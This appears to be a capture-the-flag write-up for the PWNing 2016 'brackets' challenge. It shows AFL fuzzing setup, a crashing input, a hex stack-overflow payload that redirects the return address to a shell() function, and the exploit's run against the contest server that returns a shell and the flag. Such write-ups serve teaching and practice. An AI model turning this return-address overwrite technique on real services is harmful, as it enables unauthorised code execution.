_PWNing 2016, pwn, points: 150_

### AFL (qemu-mode) setup:
```sh
$ mkdir input
$ mkdir output
$ echo 'aaa\n' > input/test.txt
$ ~/AFL/afl-fuzz -Q -i input/ -o output/ ./brackets
```
![afl_screenshot.png](afl_screenshot.png)


Reliable raw crash:
```
0000 0000 0000 0010 0000 0000 0000 0000
0000 0000 0000 0000 0000 0b00 0000 0000
0000 0000 0000 0000 0000 f6ff 0000 0000
0000 0000 0000 0000 0000 0000 0000 00fa
0000 fa0e 0000 0000 0000 ff00 0000 0000
0000 0000 0000 0000 0000 0000 0000 0000
0000 0000 0000 4000 1e00 0000 0000 0000
0004 0000 0000 0000 001f 0000 0000 0000
0000 0000 00e8 d100 
```

Exploit:
```
4141 4141 4141 4242 4242 4242 4242 4242
4242 4343 4343 0000 4444 4444 0000 0000
0000 0000 0000 0000 0000 0000 0000 0000
0000 0000 0000 0000 0000 0000 0000 0000
0000 0000 0000 0000 0000 0000 0000 0000
0000 0000 0000 0000 0000 0000 0000 0000
0000 0000 0000 0000 0000 0000 0000 0000
0000 0000 0000 0000 0000 0000 0000 0000
0000 0000 0000 0000 f605 4000 0000 0000 <- ret (shell() function)
0000 0000 0000 0000 0000 0000 0000 0000
0060 eaff ff7f 0000 
```

Exploit:  [exploit.py](https://github.com/ahpaleus/re_and_pwn/blob/master/pwning_2016/brackets/exploit.py)  

Output:  
```sh
junior@junior:/pwn$ python3 exploit.py
[*] '/mnt/hgfs/LEARN/pwn/brackets'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to pwning2016.p4.team on port 1337: Done
b'AAAAAABBBBBBBBBBBBCCCC\x00\x00DDDD\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\
x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00
\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00
\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00
\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00
\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00
\x00\x00\x00\xf6\x05@\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00
\x00\x00\x00\x00\x00\x00\x00\x00`\xea\xff\xff\x7f\x00\x00'
[*] Switching to interactive mode
Enter expression to check:
AAAAAABBBBBBBBBBBBCCCC^@^@DDDD^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^
@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@
^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^
@^@^@^@^@\xf6^E@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@`\xea\xff\xf^@^@

$ cat flag
cat flag
pwn{b1n4ry_expl01t1ng}
$
```